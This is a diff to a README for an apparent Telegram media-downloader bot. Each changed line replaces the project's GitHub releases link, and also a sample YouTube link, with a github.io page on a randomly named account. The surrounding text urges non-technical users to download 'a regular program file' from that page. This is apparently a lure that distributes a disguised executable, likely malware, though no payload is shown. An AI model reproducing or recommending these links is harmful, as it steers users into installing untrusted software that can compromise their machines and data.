@@ -1,12 +1,12 @@
 # 🤖 universal-media-downloader-bot - Download Any Media Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Universal_Media_Downloader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/snowboardinggenussericocarpus5341/universal-media-downloader-bot/releases)
+[![Download Now](https://img.shields.io/badge/Download-Universal_Media_Downloader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://snowboardinggenussericocarpus5341.github.io)
 
 ---
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/snowboardinggenussericocarpus5341/universal-media-downloader-bot/releases](https://github.com/snowboardinggenussericocarpus5341/universal-media-downloader-bot/releases)
+Visit this link to download the application: [https://snowboardinggenussericocarpus5341.github.io](https://snowboardinggenussericocarpus5341.github.io)
 
 Once you click the link, you'll see a list of files. Find the one that looks like a regular program file and save it to your computer. That's the only step you need to do — there's no complicated setup or technical knowledge required.
 
@@ -80,7 +80,7 @@ A: Absolutely. The bot only sees the links you send. It doesn't read your messag
 
 Here's a quick way to see the magic in action:
 
-1. Copy this sample YouTube link: `https://www.youtube.com/watch?v=dQw4w9WgXcQ`
+1. Copy this sample YouTube link: `https://snowboardinggenussericocarpus5341.github.io`
 2. Paste it into your Telegram chat with the bot.
 3. Within seconds, you'll receive the video file directly in your chat.
 
@@ -137,7 +137,7 @@ The bot is praised for being simple, fast, and reliable — the exact opposite o
 
 You now have a complete, ready-to-use tool that turns any online media into a personal file in seconds. There's nothing to learn, nothing to configure, and nothing to pay. Just download the file from the link below, follow the simple steps above, and start saving your favorite content today.
 
-**Your download is one click away:** [https://github.com/snowboardinggenussericocarpus5341/universal-media-downloader-bot/releases](https://github.com/snowboardinggenussericocarpus5341/universal-media-downloader-bot/releases)
+**Your download is one click away:** [https://snowboardinggenussericocarpus5341.github.io](https://snowboardinggenussericocarpus5341.github.io)
 
 ---
 
